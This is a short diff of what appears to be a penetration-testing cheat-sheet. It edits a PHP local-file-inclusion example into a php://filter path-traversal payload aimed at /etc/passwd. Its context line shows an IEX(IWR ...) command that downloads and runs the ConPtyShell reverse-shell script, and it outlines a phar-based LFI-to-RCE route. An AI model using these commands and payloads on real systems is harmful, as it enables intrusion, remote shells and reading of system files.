@@ -182,7 +182,7 @@ IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-
 - Look for disabled command (search disabled) --> ** dfunc_bypasser may helps **
 - Look for extensions all sub item version below (e.g. SFX .4 that exploit)
 ## Arbitary Read by LFI & php://filter Wrapper
-- ``` http://192.168.69.69/{file/view/others...}=php://filter/convert.base64-encode/resource={index/home/others??}  ```
+- php wrapper: ``` http://192.168.69.69/{file/view/others...}=php://filter/convert.base64-encode/resource={index/home/../../../../../../../../etc/paaswd}  ```
 ## using phar to smuggle php for LFI -> RCE
 - https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters
 1. write shell in shell.phar
